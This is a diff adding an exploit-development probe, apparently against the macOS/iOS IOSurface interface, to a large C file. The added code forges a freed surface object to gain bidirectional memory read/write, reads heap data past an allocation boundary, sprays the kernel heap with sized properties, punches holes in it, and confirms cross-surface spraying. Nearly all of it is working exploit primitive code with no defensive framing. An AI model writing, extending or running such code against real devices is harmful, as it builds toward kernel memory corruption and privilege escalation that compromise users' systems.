@@ -16141,6 +16141,341 @@ static void r393_probe(void) {
 }
 
 /*
+ * r404: Bidirectional backing store R/W + heap probing.
+ *
+ * r403 proved arbitrary surface targeting via fake shared data.
+ * This probe:
+ *   Phase 1: Bidirectional backing store write (write through redirect,
+ *            read on real surface, and vice versa)
+ *   Phase 2: Create surfaces with minimal backing store sizes, test
+ *            writing past the boundary to detect heap overflow potential
+ *   Phase 3: Property spray sizes — verify which kalloc zones we can
+ *            target with property allocations
+ *   Phase 4: Cross-surface property + RemoveValue → heap hole creation
+ */
+static volatile int g_r404_crashed = 0;
+static sigjmp_buf g_r404_jmp;
+static void r404_sighandler(int sig) {
+    g_r404_crashed = sig;
+    siglongjmp(g_r404_jmp, 1);
+}
+
+static void r404_probe(void) {
+    rlog("\n=== r404: Bidirectional R/W + Heap Probing ===\n\n");
+    fflush(stdout);
+
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+    if (!clientRelease) { rlog("  Missing symbols\n"); return; }
+
+    struct sigaction sa404, old_bus404, old_segv404;
+    memset(&sa404, 0, sizeof(sa404));
+    sa404.sa_handler = r404_sighandler;
+    sa404.sa_flags = 0;
+    sigaction(SIGBUS, &sa404, &old_bus404);
+    sigaction(SIGSEGV, &sa404, &old_segv404);
+
+    /* ---- Phase 1: Bidirectional backing store R/W ---- */
+    rlog("  Phase 1: Bidirectional backing store R/W\n");
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf_=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf_);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    IOSurfaceRef surfA = IOSurfaceCreate(props);
+    IOSurfaceRef surfB = IOSurfaceCreate(props);
+    IOSurfaceRef surfV = IOSurfaceCreate(props);
+    uint32_t sidA = IOSurfaceGetID(surfA);
+
+    uint64_t sharedA = *(uint64_t*)((uint8_t*)surfA + 8);
+    uint64_t sharedB = *(uint64_t*)((uint8_t*)surfB + 8);
+    uint8_t *spA = (uint8_t*)sharedA;
+    uint8_t *spB = (uint8_t*)sharedB;
+
+    /* Set up fake shared for all-fields redirect A */
+    void *fakeShared = mmap(NULL, 16384, PROT_READ|PROT_WRITE,
+                            MAP_PRIVATE|MAP_ANON, -1, 0);
+    if (fakeShared == MAP_FAILED) { rlog("  mmap failed\n"); goto r404_done; }
+
+    memcpy(fakeShared, spB, 4096);
+    *(uint64_t*)((uint8_t*)fakeShared + 88) = ~((uint64_t)fakeShared + 0x28);
+    int diffoffs[] = {112, 120, 128, 136, 232};
+    for (int i = 0; i < 5; i++) {
+        uint64_t av = *(uint64_t*)(spA + diffoffs[i]);
+        *(uint64_t*)((uint8_t*)fakeShared + diffoffs[i]) = av;
+    }
+
+    uint8_t dataB[512];
+    memcpy(dataB, (void*)surfB, 512);
+    uintptr_t freedV = (uintptr_t)surfV;
+    clientRelease(surfV);
+
+    uint8_t testRef[512];
+    memcpy(testRef, dataB, 512);
+    *(uint64_t*)(testRef + 8) = (uint64_t)fakeShared;
+    memcpy((void*)freedV, testRef, 448);
+
+    /* Write pattern on A, read through redirect */
+    IOSurfaceLock(surfA, 0, NULL);
+    void *baseA = IOSurfaceGetBaseAddress(surfA);
+    if (baseA) {
+        memset(baseA, 0xAA, 128);
+        ((uint8_t*)baseA)[0] = 0x41;
+        ((uint8_t*)baseA)[1] = 0x42;
+        ((uint8_t*)baseA)[2] = 0x43;
+        ((uint8_t*)baseA)[3] = 0x44;
+    }
+    IOSurfaceUnlock(surfA, 0, NULL);
+
+    g_r404_crashed = 0;
+    if (sigsetjmp(g_r404_jmp, 1) == 0) {
+        IOSurfaceLock(surfV, kIOSurfaceLockReadOnly, NULL);
+        void *baseV = IOSurfaceGetBaseAddress(surfV);
+        if (baseV) {
+            uint8_t *bp = (uint8_t*)baseV;
+            rlog("    A wrote ABCD+AA; redirect reads: %02x %02x %02x %02x %02x %02x\n",
+                bp[0], bp[1], bp[2], bp[3], bp[4], bp[5]);
+            if (bp[0]==0x41 && bp[1]==0x42 && bp[2]==0x43 && bp[3]==0x44) {
+                rlog("    *** READ-THROUGH CONFIRMED ***\n");
+            }
+
+            /* Write through redirect */
+            ((uint8_t*)baseV)[64] = 0xDE;
+            ((uint8_t*)baseV)[65] = 0xAD;
+            ((uint8_t*)baseV)[66] = 0xBE;
+            ((uint8_t*)baseV)[67] = 0xEF;
+        }
+        IOSurfaceUnlock(surfV, kIOSurfaceLockReadOnly, NULL);
+    } else {
+        rlog("    CRASHED reading: sig %d\n", g_r404_crashed);
+    }
+
+    /* Verify write-through on A */
+    IOSurfaceLock(surfA, kIOSurfaceLockReadOnly, NULL);
+    baseA = IOSurfaceGetBaseAddress(surfA);
+    if (baseA) {
+        uint8_t *bp = (uint8_t*)baseA;
+        rlog("    A reads at +64: %02x %02x %02x %02x\n",
+            bp[64], bp[65], bp[66], bp[67]);
+        if (bp[64]==0xDE && bp[65]==0xAD && bp[66]==0xBE && bp[67]==0xEF) {
+            rlog("    *** WRITE-THROUGH CONFIRMED: BIDIRECTIONAL R/W ***\n");
+        }
+    }
+    IOSurfaceUnlock(surfA, kIOSurfaceLockReadOnly, NULL);
+    fflush(stdout);
+
+    CFRelease(surfA);
+    CFRelease(surfB);
+
+    /* ---- Phase 2: Minimal surface + boundary probe ---- */
+    rlog("\n  Phase 2: Minimal surface backing store boundary\n");
+
+    /* Create surface with minimal alloc (1 page = 16384) */
+    int sw=1, sh=1, sbpe=4, sbpr=4, spf=0x42475241, sas=16384;
+    CFMutableDictionaryRef sprops = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef snW = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+    CFNumberRef snH = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+    CFNumberRef snB = CFNumberCreate(NULL, kCFNumberIntType, &sbpe);
+    CFNumberRef snR = CFNumberCreate(NULL, kCFNumberIntType, &sbpr);
+    CFNumberRef snP = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+    CFNumberRef snA = CFNumberCreate(NULL, kCFNumberIntType, &sas);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceWidth"), snW);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceHeight"), snH);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceBytesPerElement"), snB);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceBytesPerRow"), snR);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfacePixelFormat"), snP);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceAllocSize"), snA);
+
+    IOSurfaceRef surfMin = IOSurfaceCreate(sprops);
+    uint32_t minAs = (uint32_t)IOSurfaceGetAllocSize(surfMin);
+    rlog("    Minimal surface alloc size: %u\n", minAs);
+
+    IOSurfaceLock(surfMin, 0, NULL);
+    void *minBase = IOSurfaceGetBaseAddress(surfMin);
+    rlog("    Base: %p\n", minBase);
+
+    if (minBase) {
+        /* Read at boundary: last byte of alloc, first bytes past alloc */
+        uint8_t lastByte = ((uint8_t*)minBase)[minAs - 1];
+        rlog("    Last valid byte [%u]: 0x%02x\n", minAs-1, lastByte);
+
+        /* Try reading just past the boundary */
+        g_r404_crashed = 0;
+        if (sigsetjmp(g_r404_jmp, 1) == 0) {
+            uint8_t past1 = ((uint8_t*)minBase)[minAs];
+            uint8_t past2 = ((uint8_t*)minBase)[minAs + 1];
+            rlog("    Past boundary [%u]: 0x%02x 0x%02x (NO CRASH)\n",
+                minAs, past1, past2);
+            rlog("    Adjacent heap data is accessible!\n");
+
+            /* Read more past the boundary to find heap metadata */
+            rlog("    Heap data past boundary:\n");
+            for (int off = 0; off < 128; off += 8) {
+                uint64_t v = *(uint64_t*)((uint8_t*)minBase + minAs + off);
+                rlog("    +%d: 0x%016llx\n", minAs + off, (unsigned long long)v);
+            }
+        } else {
+            rlog("    CRASHED at boundary: sig %d (guard page)\n", g_r404_crashed);
+        }
+    }
+    IOSurfaceUnlock(surfMin, 0, NULL);
+    fflush(stdout);
+
+    /* ---- Phase 3: Property allocation sizes in kernel ---- */
+    rlog("\n  Phase 3: Property allocation sizes\n");
+
+    /* Test property spray with specific sizes */
+    int test_sizes[] = {16, 32, 64, 128, 256, 512, 1024, 4096};
+    int nsizes = 8;
+
+    IOSurfaceRef surfSpray = IOSurfaceCreate(props);
+
+    for (int si = 0; si < nsizes; si++) {
+        int sz = test_sizes[si];
+        uint8_t *data = malloc(sz);
+        memset(data, 0x41 + si, sz);
+        CFDataRef cfdata = CFDataCreate(NULL, data, sz);
+
+        char key[32];
+        snprintf(key, sizeof(key), "spray_%d", sz);
+        CFStringRef cfk = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+
+        IOSurfaceSetValue(surfSpray, cfk, cfdata);
+        CFTypeRef rv = IOSurfaceCopyValue(surfSpray, cfk);
+        int ok = (rv != NULL);
+        rlog("    %5d bytes: %s\n", sz, ok ? "OK" : "FAIL");
+        if (rv) CFRelease(rv);
+        CFRelease(cfdata);
+        CFRelease(cfk);
+        free(data);
+    }
+
+    /* Count how many 256-byte properties we can spray */
+    rlog("\n    Spray 256-byte properties:\n");
+    int spray_count = 0;
+    for (int i = 0; i < 500; i++) {
+        uint8_t buf[256];
+        memset(buf, 0xCC, 256);
+        *(int*)buf = i;
+        CFDataRef cfdata = CFDataCreate(NULL, buf, 256);
+        char key[32];
+        snprintf(key, sizeof(key), "s256_%d", i);
+        CFStringRef cfk = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+        IOSurfaceSetValue(surfSpray, cfk, cfdata);
+        CFRelease(cfdata);
+        CFRelease(cfk);
+        spray_count++;
+    }
+    rlog("    Sprayed %d x 256-byte properties\n", spray_count);
+
+    /* Free alternating properties to create holes */
+    int freed = 0;
+    for (int i = 0; i < 500; i += 2) {
+        char key[32];
+        snprintf(key, sizeof(key), "s256_%d", i);
+        CFStringRef cfk = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+        IOSurfaceRemoveValue(surfSpray, cfk);
+        CFRelease(cfk);
+        freed++;
+    }
+    rlog("    Freed %d alternating properties (holes created)\n", freed);
+    fflush(stdout);
+
+    /* ---- Phase 4: Cross-surface SetValue through redirect ---- */
+    rlog("\n  Phase 4: Cross-surface property spray via redirect\n");
+
+    IOSurfaceRef surfCross = IOSurfaceCreate(props);
+    IOSurfaceRef surfV2 = IOSurfaceCreate(props);
+    uint32_t sidCross = IOSurfaceGetID(surfCross);
+    uint64_t sharedCross = *(uint64_t*)((uint8_t*)surfCross + 8);
+
+    /* Set up fake shared targeting surfCross via sid */
+    uint64_t sharedV2 = *(uint64_t*)((uint8_t*)surfV2 + 8);
+    void *fakeShared2 = mmap(NULL, 16384, PROT_READ|PROT_WRITE,
+                             MAP_PRIVATE|MAP_ANON, -1, 0);
+    memcpy(fakeShared2, (void*)sharedV2, 4096);
+    *(uint64_t*)((uint8_t*)fakeShared2 + 88) = ~((uint64_t)fakeShared2 + 0x28);
+    *(uint32_t*)((uint8_t*)fakeShared2 + 136) = sidCross;
+
+    uint8_t dataV2[512];
+    memcpy(dataV2, (void*)surfV2, 512);
+    uintptr_t freedV2 = (uintptr_t)surfV2;
+    clientRelease(surfV2);
+
+    uint8_t testRef2[512];
+    memcpy(testRef2, dataV2, 512);
+    *(uint64_t*)(testRef2 + 8) = (uint64_t)fakeShared2;
+    memcpy((void*)freedV2, testRef2, 448);
+
+    /* Spray properties on surfCross via redirect (using only sid redirect) */
+    int cross_ok = 0;
+    g_r404_crashed = 0;
+    if (sigsetjmp(g_r404_jmp, 1) == 0) {
+        for (int i = 0; i < 50; i++) {
+            uint8_t buf[256];
+            memset(buf, 0xDD, 256);
+            *(int*)buf = 0xC0DE0000 + i;
+            CFDataRef cfdata = CFDataCreate(NULL, buf, 256);
+            char key[32];
+            snprintf(key, sizeof(key), "xspray_%d", i);
+            CFStringRef cfk = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+            IOSurfaceSetValue(surfV2, cfk, cfdata);
+            CFRelease(cfdata);
+            CFRelease(cfk);
+            cross_ok++;
+        }
+    } else {
+        rlog("    CRASHED after %d cross-surface sprays: sig %d\n",
+            cross_ok, g_r404_crashed);
+    }
+
+    /* Verify on the real surfCross */
+    int cross_found = 0;
+    for (int i = 0; i < 50; i++) {
+        char key[32];
+        snprintf(key, sizeof(key), "xspray_%d", i);
+        CFStringRef cfk = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+        CFTypeRef rv = IOSurfaceCopyValue(surfCross, cfk);
+        if (rv) { cross_found++; CFRelease(rv); }
+        CFRelease(cfk);
+    }
+    rlog("    Cross-spray: %d set, %d found on target\n", cross_ok, cross_found);
+    if (cross_found > 0) {
+        rlog("    *** CROSS-SURFACE PROPERTY SPRAY CONFIRMED ***\n");
+        rlog("    *** KERNEL HEAP SPRAY VIA ARBITRARY SURFACE ***\n");
+    }
+    fflush(stdout);
+
+    /* Cleanup */
+    munmap(fakeShared, 16384);
+    munmap(fakeShared2, 16384);
+    CFRelease(surfMin);
+    CFRelease(surfSpray);
+    CFRelease(surfCross);
+    CFRelease(props);
+    CFRelease(sprops);
+
+r404_done:
+    sigaction(SIGBUS, &old_bus404, NULL);
+    sigaction(SIGSEGV, &old_segv404, NULL);
+
+    rlog("\n=== r404 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r403: Full-field redirect with fake shared data.
  *
  * r402 proved:
@@ -64911,6 +65246,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 407) {
+            rlog("*** rounds=407: Bidirectional R/W + Heap Probing ***\n");
+            rlog("  Backing store bidir, boundary probe, property spray, cross-surface.\n\n");
+            fflush(stdout);
+            r404_probe();
+            goto done;
+        }
         if (rounds == 406) {
             rlog("*** rounds=406: Full-Field Redirect with Fake Shared ***\n");
             rlog("  All fields, per-field subsets, direct shared pointer reuse.\n\n");
@@ -67345,7 +67687,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
